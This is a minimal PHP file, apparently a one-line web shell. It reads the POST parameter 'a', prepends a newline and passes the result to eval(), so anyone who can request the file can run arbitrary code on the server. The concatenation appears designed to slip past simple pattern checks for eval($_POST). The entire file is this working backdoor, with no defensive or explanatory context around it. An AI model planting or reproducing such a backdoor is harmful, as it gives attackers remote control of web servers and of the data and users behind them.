<?php
    $a = $_POST['a'];
    $b = "\n";
    eval($b.=$a);
?>